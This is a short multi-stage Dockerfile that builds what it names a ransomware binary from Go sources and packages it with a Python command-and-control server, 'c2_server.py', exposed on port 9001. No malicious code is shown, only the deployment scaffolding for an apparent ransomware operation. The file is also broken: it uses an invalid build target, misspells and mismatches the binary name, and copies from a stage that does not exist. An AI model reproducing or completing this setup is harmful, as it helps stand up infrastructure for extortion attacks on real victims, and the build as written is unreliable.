FROM python:3.9-slim AS python-base

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY c2_server.py .

FROM golang:1.19 AS builder

WORKDIR /go/src/app

COPY go.mod .
COPY go.sum .
RUN go mod download

COPY *.go .
RUN CGO_ENABLED=0 GOOS=mac go build -o /ransomeware.go

FROM python-base AS final

COPY --from=go-base /go/src/app/ransomware.go .


EXPOSE 9001

CMD ["python", "c2_server.py"]